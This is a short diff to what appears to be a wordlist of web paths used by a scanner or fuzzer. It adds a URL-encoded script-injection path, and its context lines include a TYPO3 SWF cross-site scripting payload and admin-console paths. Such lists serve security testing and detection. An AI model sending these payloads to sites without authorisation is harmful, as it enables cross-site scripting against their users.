@@ -112,3 +112,4 @@
 /typo3/contrib/websvg/svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(31337),this.x=1}//
 /www/delivery/afr.php?refresh=10000&
 /auth/realms/master/clients-registrations/default/security-admin-console
+/index.php/%3C/script%3E%3Cscript%3Edocument.write(
